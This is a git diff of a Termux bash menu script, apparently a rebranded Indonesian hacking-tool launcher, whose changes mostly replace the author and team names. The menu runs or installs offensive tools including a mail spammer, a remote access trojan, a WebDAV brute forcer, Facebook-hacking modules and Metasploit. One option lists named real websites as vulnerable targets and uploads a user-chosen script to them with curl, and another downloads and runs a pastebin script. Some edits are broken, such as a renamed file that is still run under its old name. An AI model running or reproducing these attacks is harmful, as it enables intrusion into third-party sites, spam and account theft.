@@ -12,13 +12,13 @@ red='\033[31;1m'
 white='\033[37;1m'                                           
 yellow='\033[33;1m'
 sleep 1
-toilet -f big -F gay "T00Ls" | lolcat
-toilet -f big -F gay "B4J1N64Nv5" 
+toilet -f big -F gay "T00LS" | lolcat
+toilet -f big -F gay "MR.XXII" 
 echo ""      
-echo "\033[32;1mAuthor : Mr.B4J1N64N Feat Mr.IM81" 
-echo "\033[35;1mTeam : DARKNESS CYBER TEAM"
-echo "\033[33;1mKontak Me :  083108271123"
-echo "\033[31;1mSubcribe Youtube:"
+echo "\033[32;1mAuthor : Mr.XXII Cyber" 
+echo "\033[35;1mTeam : ZONARED XXII SECURITY HACKER COMMANDER"
+echo "\033[33;1mKontak Me : https://bit.ly/3yYoNJH"
+echo "\033[31;1mSubcribe Youtube: https://bit.ly/3kglnhk"
 echo "\033[33;1mDarkness Cyber Team" "\033[32;1m&" "\033[36;1mIndonesia Security Lite"
 echo "\033[34;1m[============================[>"
 sleep 1
@@ -229,12 +229,12 @@ echo "[===============================================]>"
 echo $yellow "0.> keluar"
 echo "[===============================================]>"
 echo "\033[32;1m"
-read -p "[root@T00Ls-B4J1N64Nv5:~#" bro
+read -p "[noroot@T00LS-MR.XXII:~#" bro
 
 if [ $bro = 1 ] || [ $bro = 1 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.XXII" | lolcat
 cd module
 php tp.php
 fi
@@ -243,14 +243,14 @@ if
 [ $bro = 2 ] || [ $bro = 2 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.XXII"
 cd module
 php t.php
 fi
 
 if [ $bro = 3 ] || [ $bro = 3 ]
 then
-figlet "Mr.B4J1N64N"
+figlet "Mr.XXII"
 cd module
 php mataharimall.php
 fi
@@ -258,7 +258,7 @@ fi
 if [ $bro = 4 ] || [ $bro = 4 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.XXII"
 cd module
 php hooq.php
 fi
@@ -266,7 +266,7 @@ fi
 if [ $bro = 5 ] || [ $bro = 5 ]
 then
 clear
-toilet -f slant --gay "Mr.B4J1N64N"
+toilet -f slant --gay "Mr.XXII"
 cd module
 php kfc.php
 fi
@@ -274,7 +274,7 @@ fi
 if [ $bro = 6 ] || [ $bro = 6 ]
 then
 clear
-toilet -f mono12 -F gay "Mr.B4J1N64N"
+toilet -f mono12 -F gay "Mr.XXII"
 cd module
 php phd.php
 fi
@@ -282,7 +282,7 @@ fi
 if [ $bro = 7 ] || [ $bro = 7 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.XXII"
 cd module
 php whiskas.php
 fi
@@ -290,7 +290,7 @@ fi
 if [ $bro = 8 ] || [ $bro = 8 ]
 then
 clear
-figlet "Mr.B4J1N64N"
+figlet "Mr.XXII"
 cd module
 php zipay.php
 fi
@@ -298,7 +298,7 @@ fi
 if [ $bro = 9 ] || [ $bro = 9 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.XXII"
 cd module
 php key.php
 fi
@@ -306,7 +306,7 @@ fi
 if [ $bro = 10 ] || [ $bro = 10 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.XXII"
 cd module
 python2 SpamMail.py
 fi
@@ -314,7 +314,7 @@ fi
 if [ $bro = 11 ] || [ $bro = 11 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.XXII"
 cd module
 python2 whs.py
 fi
@@ -322,7 +322,7 @@ fi
 if [ $bro = 12 ] || [ $bro = 12 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.XXII"
 cd module
 python2 upf.py
 fi
@@ -330,7 +330,7 @@ fi
 if [ $bro = 13 ] || [ $bro = 13 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.XXII"
 cd module
 python2 create.py
 fi
@@ -338,7 +338,7 @@ fi
 if [ $bro = 14 ] || [ $bro = 14 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.XXII"
 cd module
 python2 dog.py
 fi
@@ -346,7 +346,7 @@ fi
 if [ $bro = 15 ] || [ $bro = 15 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.XXII"
 cd module
 python2 gam.py
 fi
@@ -354,7 +354,7 @@ fi
 if [ $bro = 16 ] || [ $bro = 16 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.XXII"
 cd module
 python2 anvima.py
 fi
@@ -362,7 +362,7 @@ fi
 if [ $bro = 17 ] || [ $bro = 17 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.XXII"
 cd module
 python2 htmd.py
 fi
@@ -370,7 +370,7 @@ fi
 if [ $bro = 18 ] || [ $bro = 18 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.XXII"
 cd module
 php autolike.php
 fi
@@ -378,7 +378,7 @@ fi
 if [ $bro = 19 ] || [ $bro = 19 ]
 then
 clear
-toilet "Mr.B4J1N64N"
+toilet "Mr.XXII"
 cd module
 python2 auto_reaction.py
 fi
@@ -386,7 +386,7 @@ fi
 if [ $bro = 20 ] || [ bro = 20 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.XXII" | lolcat
 cd module
 python2 botkomen.py
 fi
@@ -394,7 +394,7 @@ fi
 if [ $bro = 21 ] || [ $bro = 21 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.XXII" | lolcat
 git clone https://github.com/kuburan/txtool
 mv txtool $HOME
 cd $HOME/txtool
@@ -407,7 +407,7 @@ fi
 if [ $bro = 22 ] || [ bro = 22 ]
 then
 clear
-toilet -f slant -F gay "Mr.B4J1N64N" 
+toilet -f slant -F gay "Mr.XXII" 
 pkg install update && pkg install upgrade
 pkg install git
 pkg install php
@@ -418,7 +418,7 @@ fi
 if [ $bro = 23 ] || [ $bro = 23 ]
 then
 clear
-toilet -f mono12 -F gay "Mr.B4J1N64N" 
+toilet -f mono12 -F gay "Mr.XXII" 
 apt upgrade
 apt install python2
 apt install git
@@ -431,7 +431,7 @@ fi
 if [ $bro = 24 ] || [ $bro = 24 ]
 then
 clear
-toilet -f standard -F gay "Mr.B4J1N64N" 
+toilet -f standard -F gay "Mr.XXII" 
 echo "\033[33;1muntuk tutorial kunjungi:" "\033[36;1m https://youtu.be/h2I5HU3W-so"
 sleep 3
 apt update
@@ -447,7 +447,7 @@ fi
 if [ $bro = 25 ] || [ $bro = 25 ]
 then
 clear
-toilet -f standard -F gay "Mr.B4J1N64N" 
+toilet -f standard -F gay "Mr.XXII" 
 apt update
 apt install git
 apt install tor
@@ -461,7 +461,7 @@ fi
 if [ $bro = 26 ] || [ $bro = 26 ]
 then
 clear
-toilet -f standard -F gay "Mr.B4J1N64N" 
+toilet -f standard -F gay "Mr.XXII" 
 echo "\033[33;1muntuk tutorial kunjungi:" "\033[36;1m https://youtu.be/EskgepQSB7U"
 sleep 3
 apt update
@@ -476,7 +476,7 @@ fi
 if [ $bro = 27  || [ $bro = 27 ]
 then
 clear
-toilet -f standard -F gay "Mr.B4J1N64N" 
+toilet -f standard -F gay "Mr.XXII" 
 apt update
 apt install git
 git clone https://github.com/b3-v3r/Hunner.git
@@ -489,7 +489,7 @@ fi
 if [ $bro = 28 ] || [ $bro = 28 ]
 then
 clear
-toilet -f standard -F gay "Mr.B4J1N64N"
+toilet -f standard -F gay "Mr.XXII"
 apt update
 apt install git
 git clone https://github.com/sqlmapproject/sqlmap
@@ -502,7 +502,7 @@ fi
 if [ $bro = 29 ] || [ $bro = 29 ]
 then
 clear
-toilet -f standard -F gay "Mr.B4J1N64N" 
+toilet -f standard -F gay "Mr.XXII" 
 apt update
 apt install git
 git clone https://github.com/aryanrtm/4wsectools
@@ -515,7 +515,7 @@ fi
 if [ $bro = 30 ] || [ $bro = 30 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.XXII" | lolcat
 apt update && upgrade
 apt install python2 
 apt install git
@@ -526,11 +526,11 @@ fi
 if [ $bro = 31 ] || [ $bro = 31 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 echo "\033[32;m====================Mempercepat / menstabilkan sinyal===================="
 sleep 1
-echo "\033[32;1m================================By Mr.B4J1N64N================================"
+echo "\033[32;1m================================By Mr.XXII================================"
 sleep 1
 echo ""
 echo ""
@@ -540,7 +540,7 @@ fi
 if [ $bro = 32 ] || [ $bro = 32 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 echo "\033[32;m===================Mempercepat / menstabilkan sinyal 2===================="
 sleep 1
@@ -554,7 +554,7 @@ fi
 if [ $bro = 33 ] || [ $bro = 33 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 git clone https://github.com/Hood3dRob1n/BinGoo
 mv BinGoo $HOME
@@ -565,7 +565,7 @@ fi
 if [ $bro = 34 ] || [ $bro = 34 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 cd module
 python2 facebook.py
@@ -574,7 +574,7 @@ fi
 if [ $bro = 35 ] || [ $bro = 35 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install termux-api
@@ -589,7 +589,7 @@ fi
 if [ $bro = 36 ] || [ $bro = 36 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install ruby
@@ -604,7 +604,7 @@ fi
 if [ $bro = 37 ] || [ $bro = 37 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install python2
@@ -620,7 +620,7 @@ fi
 if [ $bro = 38 ] || [ $bro = 38 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1 
 apt install git
 apt install php
@@ -634,7 +634,7 @@ fi
 if [ $bro = 39 ] || [ $bro = 39 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1 
 apt install git
 apt install php
@@ -647,7 +647,7 @@ fi
 if [ $bro = 40 ] || [ $bro = 40 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1 
 apt install git
 apt install bash
@@ -661,7 +661,7 @@ fi
 if [ $bro = 41 ] || [ $bro = 41 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 git clone https://github.com/MrKeepSmile/errorcybertool.git
 mv errorcybertool $HOME
@@ -673,7 +673,7 @@ fi
 if [ $bro = 42 ] || [ $bro = 42 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 git clone https://github.com/Xi4u7/A-Rat.git
 mv A-Rat $HOME
@@ -684,7 +684,7 @@ fi
 if [ $bro = 43 ] || [ $bro = 43 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 git clone https://github.com/DarknessCyberTeam/Scan-Website-Admin-Login
 mv Scan-Website-Admin-Login $HOME
@@ -696,8 +696,8 @@ if [ $bro = 44 ] || [ $bro = 44 ]
 then
 clear
 echo "\033[34;1m"
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet -f slant MrB4J1N64N
+cowsay -f kiss.cow "Mr.XXII" | lolcat
+figlet -f slant MrXXII
 echo "\033[37;1m"
 echo "Masukan Web target"
 echo "Contoh Web Target vuln"
@@ -709,10 +709,10 @@ echo "	http://50-50-50.ru/"
 echo "	http://tirupurjobs.net/"
 echo "	http://Matrimony.co.za/"
 echo "	http://Bheh.co.za/"
-read -p "[MrB4J1N64N]>" target
+read -p "[MrXXII]>" target
 echo "Masukan Nama script kalian"
 echo "yang ada di Luar Folder Ruang Penyimpanan"
-read -p "[MrB4J1N64N]>" script
+read -p "[MrXXII]>" script
 curl -T /storage/emulated/0/$script $target
 echo "\033[33;1m"
 echo "Selesai! Tod Cek di $target $script "
@@ -721,8 +721,8 @@ fi
 if [ $bro = 45 ] || [ $bro = 45 ]
 then
 clear
-cowsay -f sheep.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f sheep.cow "MrXXII" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 cd
 cd module
@@ -732,8 +732,8 @@ fi
 if [ $bro = 46 ] || [ $bro = 46 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "MrXXII" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 cd module
 python2 r.py
@@ -743,10 +743,10 @@ if [ $bro = 47 ] || [ $bro = 47 ]
 then
 clear
 toilet -f standard -F gay "BruteWebdav"
-echo "\033[32;1mauthor: Mr.B4J1N64N"
-echo "\033[33;1mTeam: Darkness Cyber Team"
-echo "\033[34;1mIndonesia Security Lite"
-echo "\033[32;1mJawaBarat Blackhat Army"
+echo "\033[32;1mauthor: Mr.XXII"
+echo "\033[33;1mTeam: Zonared XXII Cyber Team"
+echo "\033[34;1mSecurity Hacker Commander"
+echo "\033[32;1mSeram Bagian Timur"
 echo "Masukan nama script"
 read -p "[=======>" script
 echo "\033[32;1m"
@@ -798,8 +798,8 @@ fi
 if [ $bro = 48 ] || [ $bro = 48 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "MrXXII" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 pkg install w3m
 w3m www.google.com
@@ -808,8 +808,8 @@ fi
 if [ $bro = 49 ] || [ $bro = 49 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "MrXXII" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install pip
@@ -824,8 +824,8 @@ fi
 if [ $bro = 50 ] || [ $bro = 50 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "MrXXII" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 cd module
 python2 cinta.py
@@ -834,8 +834,8 @@ fi
 if [ $bro = 51 ] || [ $bro = 51 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "MrXXII" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 pkg install php
 pkg install wget
@@ -847,8 +847,8 @@ fi
 if [ $bro = 52 ] || [ $bro = 52 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "MrXXII" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 pkg install curl
 curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh
@@ -864,8 +864,8 @@ fi
 if [ $bro = 53 ] || [ $bro = 53 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "MrXXII" | lolcat
+figlet "Mr.XXII" | lolcat
 echo "\033[33;1muntuk tutorial kunjungi:" "\033[36;1m https://youtu.be/FsI4pCapfLY"
 sleep 3
 cd module
@@ -875,8 +875,8 @@ fi
 if [ $bro = 54 ] || [ $bro = 54 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "MrXXII" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install python2
@@ -895,8 +895,8 @@ if [ $bro = 55 ] || [ $bro = 55 ]
 then
 clear
 echo "\033[31;1m"
-cowsay ghostbusters.cow "MrB4J1N64N" 
-figlet "Mr.B4J1N64N" | lolcat
+cowsay ghostbusters.cow "MrXXII" 
+figlet "Mr.XXII" | lolcat
 apt update && apt upgrade
 apt install python2
 apt install python
@@ -912,8 +912,8 @@ fi
 if [ $bro = 56 ] || [ $bro = 56 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "MrXXII" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 apt install php
 apt install curl
@@ -926,7 +926,7 @@ fi
 if [ $bro = 57 ] || [ $bro = 57 ]
 then
 clear
-toilet -f slant --gay "Mr.B4J1N64N"
+toilet -f slant --gay "Mr.XXII"
 apt update && apt upgrade
 apt install git
 apt install clang
@@ -942,7 +942,7 @@ fi
 if [ $bro = 58 ] || [ $bro = 58 ]
 then
 clear
-figlet "Mr.B4J1N64N" | lolcat
+figlet "Mr.XXII" | lolcat
 echo "\033[33;1muntuk tutorial kunjungi:" "\033[36;1mhttps://youtu.be/VuCvj-8JIME"
 sleep 3
 apt install git
@@ -961,8 +961,8 @@ fi
 if [ $bro = 59 ] || [ $bro = 59 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "MrXXII" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install python2
@@ -979,8 +979,8 @@ fi
 if [ $bro = 60 ] || [ $bro = 60 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "MrXXII" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install php
@@ -995,8 +995,8 @@ fi
 if [ $bro = 61 ] || [ $bro = 61 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "MrXXII" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install git
@@ -1010,8 +1010,8 @@ fi
 if [ $bro = 62 ] || [ $bro = 62 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "MrXXII" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install git
@@ -1026,8 +1026,8 @@ fi
 if [ $bro = 63 ] || [ $bro = 63 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "MrXXII" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install git
@@ -1042,8 +1042,8 @@ fi
 if [ $bro = 64 ] || [ $bro = 64 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "MrXXII" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install git
@@ -1058,8 +1058,8 @@ fi
 if [ $bro = 65 ] || [ $bro = 65 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "MrXXII" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install git
@@ -1077,8 +1077,8 @@ fi
 if [ $bro = 66 ] || [ $bro = 66 ]
 then
 clear
-cowsay -f kiss.cow "MrB4J1N64N" | lolcat
-figlet "Mr.B4J1N64N" | lolcat
+cowsay -f kiss.cow "MrXXII" | lolcat
+figlet "Mr.XXII" | lolcat
 sleep 1
 apt update && apt upgrade
 apt install git
@@ -1093,7 +1093,7 @@ fi
 if [ $bro = 67 ] || [ $bro = 67 ]
 then
 clear
-toilet -f standard -F gay "Mr.IM81"
+toilet -f standard -F gay "Mr.XXII"
 echo "\033[33;1muntuk tutorial kunjungi:" "\033[36;1m https://youtu.be/qJc1KaD3QcQ"
 sleep 5
 pkg install git
@@ -1107,7 +1107,7 @@ fi
 if [ $bro = 68 ] || [ $bro = 68 ]
 then
 clear
-toilet -f standard -F gay "Mr.IM81"
+toilet -f standard -F gay "Mr.XXII"
 echo "Copy Link nya => Paste Ke Browser"
 
 echo "\033[33;1mCara Hack Facebook Di Termux:" "\033[36;1m https://youtu.be/FsI4pCapfLY"
@@ -1164,7 +1164,7 @@ fi
 if [ $bro = 69 ] || [ $bro = 69 ]
 then
 clear
-toilet -f standard -F gay "Mr.IM81"
+toilet -f standard -F gay "Mr.XXII"
 echo "\033[33;1mUntuk Tutorial Kunjungi:" "\033[36;1mhttps://youtu.be/Us11rFsJb7A"
 sleep 5
 pkg install irssi
@@ -1174,7 +1174,7 @@ fi
 if [ $bro = 70 ] || [ $bro = 70 ]
 then
 clear
-toilet -f standard -F gay "Mr.IM81"
+toilet -f standard -F gay "Mr.XXII"
 echo "\033[33;1mUntuk Tutorial Kunjungi:" "\033[36;1mhttps://youtu.be/nw9_ECb8VQA"
 sleep 5
 pkg install python2
@@ -1188,7 +1188,7 @@ fi
 if [ $bro = 71 ] || [ $bro = 71 ]
 then
 clear
-toilet -f standard -F gay "Mr.IM81"
+toilet -f standard -F gay "Mr.XXII"
 echo "\033[33;1mUntuk Tutorial Kunjungi:" "\033[36;1mhttps://youtu.be/LU0QMstAI88"
 sleep 5
 pkg install php
@@ -1205,7 +1205,7 @@ fi
 if [ $bro = 72 ] || [ $bro = 72 ]
 then
 clear
-toilet -f standard -F gay "Mr.IM81"
+toilet -f standard -F gay "Mr.XXII"
 pkg install moon-buggy
 moon-buggy
 fi
@@ -1213,7 +1213,7 @@ fi
 if [ $bro = 73 ] || [ $bro = 73 ]
 then
 clear
-toilet -f standard -F gay "Mr.IM81"
+toilet -f standard -F gay "Mr.XXII"
 echo "\033[33;1mUntuk Tutorial Kunjungi:" "\033[36;1mhttps://youtu.be/yIf57xxWaoI"
 sleep 5
 pkg install git
@@ -1227,7 +1227,7 @@ fi
 if [ $bro = 74 ] || [ $bro = 74 ]
 then
 clear
-toilet -f standard -F gay "Mr.IM81"
+toilet -f standard -F gay "Mr.XXII"
 echo "\033[33;1mUntuk Tutorial Kunjungi:" "\033[36;1mhttps://youtu.be/F2hjIGg4RtI"
 sleep 5
 pkg install python2
@@ -1239,7 +1239,7 @@ fi
 if [ $bro = 75 ] || [ $bro = 75 ]
 then
 clear
-toilet -f standard -F gay "Mr.B4J1N64N"
+toilet -f standard -F gay "Mr.XXII"
 pkg install git
 pkg install python2
 git clone https://github.com/CiKu370/md5-crack.git
@@ -1251,7 +1251,7 @@ fi
 if [ $bro = 76 ] || [ $bro = 76 ]
 then
 clear
-toilet -f standard -F gay "Mr.IM81"
+toilet -f standard -F gay "Mr.XXII"
 echo "\033[33;1mUntuk Tutorial Kunjungi:" "\033[36;1mhttps://youtu.be/I5yMLbjvhiY"
 pkg install python2
 pkg install php
@@ -1269,7 +1269,7 @@ fi
 if [ $bro = 77 ] || [ $bro = 77 ]
 then
 clear
-toilet -f standard -F gay "Mr.B4J1N64N"
+toilet -f standard -F gay "Mr.XXII"
 pkg install python
 pkg install git
 pkg install php
@@ -1283,7 +1283,7 @@ fi
 if [ $bro = 78 ] || [ $bro = 78 ]
 then
 clear
-toilet -f standard -F gay "Mr.B4J1N64N"
+toilet -f standard -F gay "Mr.XXII"
 pkg update && pkg upgrade
 pkg install git 
 pkg install python2
@@ -1296,7 +1296,7 @@ fi
 if [ $bro = 79 ] || [ $bro = 79 ]
 then
 clear
-toilet -f standard -F gay "Mr.IM81"
+toilet -f standard -F gay "Mr.XXII"
 pkg install neofetech
 neofetech
 fi
@@ -1304,7 +1304,7 @@ fi
 if [ $bro = 80 ] || [ $bro = 80 ]
 then
 clear
-toilet -f standard -F gay "Mr.B4J1N64N"
+toilet -f standard -F gay "Mr.XXII"
 pkg install python2
 pkg install git
 git clone https://github.com/CiKu370/lhst
@@ -1330,7 +1330,7 @@ fi
 if [ $bro = 82 ] || [ $bro = 82 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N " | lolcat
+toilet -f big -F gay "Mr.XXII " | lolcat
 sleep 1
 echo -e $green "Sedang Menginstall"
 sleep 1
@@ -1347,7 +1347,7 @@ fi
 if [ $bro = 83 ] || [ $bro = 83 ]
 then
 clear
-toilet -f big -F gay " Mr.B4J1N64N " | lolcat
+toilet -f big -F gay " Mr.XXII " | lolcat
 sleep 1
 apt update && apt upgrade
 apt install git
@@ -1363,7 +1363,7 @@ fi
 if [ $bro = 84 ] || [ $bro = 84 ]
 then
 clear
-toilet -f big -F gay " Mr.B4J1N64N "
+toilet -f big -F gay " Mr.XXII "
 sleep 1
 apt update && apt upgrade
 apt install wget
@@ -1379,7 +1379,7 @@ fi
 if [ $bro = 85 ] || [ $bro = 85 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.XXII"
 sleep 1
 apt update && apt upgrade
 apt install git
@@ -1392,13 +1392,13 @@ fi
 if [ $bro = 86 ] || [ $bro = 86 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.XXII"
 sleep 1
 apt update && apt upgrade
 pkg install php
 pkg install wget
-wget https://pastebin.com/raw/sPpJRjCZ -O lokomedia.php
-mv lokomedia.php $HOME
+wget https://pastebin.com/raw/sPpJRjCZ -O tokopedia.php
+mv tokopedia.php $HOME
 cd
 php lokomedia.php 
 fi
@@ -1406,7 +1406,7 @@ fi
 if [ $bro = 87 ] || [ $bro = 87 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N" 
+toilet -f big -F gay "Mr.XXII" 
 sleep 1
 apt update 
 apt upgrade
@@ -1421,7 +1421,7 @@ fi
 if [ $bro = 88 ] || [ $bro = 88 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N" | lolcat
+toilet -f big -F gay "Mr.XXII" | lolcat
 sleep 1
 apt update 
 apt upgrade
@@ -1436,7 +1436,7 @@ fi
 if [ $bro = 89 ] || [ $bro = 89 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N" | lolcat
+toilet -f big -F gay "Mr.XXII" | lolcat
 sleep 1
 apt update 
 apt upgrade
@@ -1451,7 +1451,7 @@ fi
 if [ $bro = 90 ] || [ $bro = 90 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N" | lolcat
+toilet -f big -F gay "Mr.XXII | lolcat
 sleep 1
 apt update 
 apt upgrade
@@ -1466,7 +1466,7 @@ fi
 if [ $bro = 91 ] || [ $bro = 91 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N" | lolcat
+toilet -f big -F gay "Mr.XXII" | lolcat
 sleep 1
 apt update 
 apt upgrade
@@ -1496,7 +1496,7 @@ fi
 if [ $bro = 93 ] || [ $bro = 93 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.XXII"
 sleep 1
 aptupdate
 apt upgrade
@@ -1513,7 +1513,7 @@ fi
 if [ $bro = 94 ] || [ $bro = 94 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.XXII"
 sleep 1
 apt update
 apt upgrade
@@ -1527,7 +1527,7 @@ fi
 if [ $bro = 95 ] || [ $bro = 95 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.XXII"
 sleep 1
 apt update
 apt upgrade
@@ -1542,7 +1542,7 @@ fi
 if [ $bro = 96 ] || [ $bro = 96 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.XXII"
 sleep 1
 apt update 
 apt upgrade
@@ -1557,7 +1557,7 @@ fi
 if [ $bro = 97 ] || [ $bro = 97 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.XXII"
 sleep 1
 apt update 
 apt upgrade
@@ -1572,7 +1572,7 @@ fi
 if [ $bro = 98 ] || [ $bro = 98 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.XXII"
 sleep 1
 apt update 
 apt upgrade
@@ -1587,7 +1587,7 @@ fi
 if [ $bro = 99 ] || [ $bro = 99 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.XXII"
 sleep 1
 apt update 
 apt upgrade
@@ -1602,7 +1602,7 @@ fi
 if [ $bro = 100 ] || [ $bro = 100 ]
 then
 clear
-toilet -f big -F gay "Mr.B4J1N64N"
+toilet -f big -F gay "Mr.XXII"
 sleep 1
 apt update 
 apt upgrade
@@ -1616,7 +1616,7 @@ fi
 
 if [ $bro = 0 ] || [ $bro = 00 ]
 then
-echo "\033[32;1mDARKNESS CYBER TEAM"
+echo "\033[32;1mZONARED XXII SECURITY HACKER COMMANDER TEAM"
 sleep 1
 echo "\033[33;1mWe Security"
 sleep 1
